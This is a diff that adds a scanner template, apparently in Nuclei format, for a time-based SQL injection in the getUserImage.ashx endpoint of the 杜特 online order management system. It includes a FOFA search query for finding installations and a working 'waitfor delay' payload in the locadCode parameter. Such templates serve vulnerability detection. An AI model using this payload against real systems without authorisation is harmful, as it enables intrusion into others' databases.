@@ -1,0 +1,47 @@
+id: poc-yaml-tutor-ooms-getuserimage-ashx-sqli
+info:
+  name: 杜特网上订单管理系统 getUserImage.ashx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 杜特网上订单管理系统
+    fofa: app="TUTORSOFT-ERP"
+
+variables:
+  t1: "{{rand_int(4,9)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, "欢迎登陆到网上订单系统")
+
+  - raw:
+      - |
+        GET /ajax/getUserImage.ashx?locadCode=admin%27/**/and(select+1)>0waitfor/**/delay%270:0:{{t1}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: content-type
+        words:
+          - "image/pjpeg"
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: dsl
+        dsl:
+          - duration > to_number(t1)
+          - duration < to_number(t2)
